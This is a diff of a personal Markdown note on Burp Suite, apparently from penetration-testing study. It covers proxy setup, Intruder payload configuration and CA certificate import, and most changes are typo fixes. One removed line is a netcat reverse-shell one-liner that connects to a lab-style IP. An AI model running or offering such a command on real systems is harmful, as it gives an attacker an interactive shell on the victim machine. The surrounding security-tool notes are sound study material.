@@ -26,12 +26,24 @@ For article on the [[BurpSuite-Pro-Version]]
 - Proxy: intercept and modify requests and responses
 	- Logging
 		- HTTP History Sub-Tab
-		- WebSockets Sub-Tab
-	- WebSocket support
+		- Web Sockets Sub-Tab
+	- Web Socket support
 	- Match and Replace
 		- Use [[Regular-Expressions]] to modify incoming and outgoing requests
-- Repeater: capturing, modifying and resending a request
+- Repeater: capturing, modifying and re-sending a request
 - Intruder: Rate-limited (Community version) endpoint spraying tool
+	- Positions: select attack type and configure payload within the request with the `§` symbol
+	- Payloads: value configuration of payload
+		- Payload sets
+			- Payload set for the number of set(s) of payloads
+			- Payload type
+		- Payload settings
+			- Load or Paste payloads into selected Payload type 
+		- Payload processing
+			- Add, Edit, Define and prioritise rules to perform processing tasks  
+		- Payload encoding
+	- Resource Pool: Automation configure a feature of [[Burpsuite-Pro-Version]]
+	- Settings: configure attack behaviour and Burp Suite's result handling
 - Decoder: Decodes data
 - Comparer: compares two data streams at the word or byte level
 - Sequencer: assess token randomness
@@ -61,18 +73,17 @@ Other Tabs:
 - Builtin Browser, never setup the burp certificate with your own browser every again!
 Go to `Project settings -> no sandbox for builtin browser`
 
-## FoxyProxy/Firefox proxy
+## FoxyProxy / Firefox proxy
 
 Firefox menu -> Settings -> Network Settings click Settings
 Select manual proxy configuration:
 	HTTP proxy: 127.0.0.1 8080
 	uncheck: Also use this proxy for FTP and HTTPS 
 	delete: ANYTHING in the "No proxy for" field
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.98 8888 >/tmp/f
 
 ## Burp Suite CA
 
-To intercept and analyze HTTPS traffic, BS has Certificate Authority and uses it to issue on-th-fly certifactes for each website that we visit and pass through Burp.
+To intercept and analyse HTTPS traffic, BS has Certificate Authority and uses it to issue on-th-fly certificates for each website that we visit and pass through Burp.
 
 http://burp -> CA Certificate 
 save the file cacert.der to `/home/<user>/Downloads`
@@ -84,9 +95,9 @@ GOTO Certificate manager in Firefox -> Import it!
 
 Need pass through for:
 - Targeting
-- Required mutual authenication or HTTP Public Key Pinning
+- Required mutual authentication or HTTP Public Key Pinning
 
-## Bypass intercepting HTTPS traffic by configurating to forward traffics towards websites without decrypting and re-encrypting them first.
+## Bypass intercepting HTTPS traffic by configuration to forward traffics towards websites without decryption and re-encrypting them first.
 
 ## SOCKS Proxy in Burp
 
@@ -103,7 +114,7 @@ right click and add under main `Target Site map` tab.
 
 ## "Bad Request This combination of host and port requires TLS" -> Read Url
 
-Use https in url you fool!
+Use https in URL you fool!
 
 ## Software is preventing site X browser from connecting -> Setup certificates in browser
 
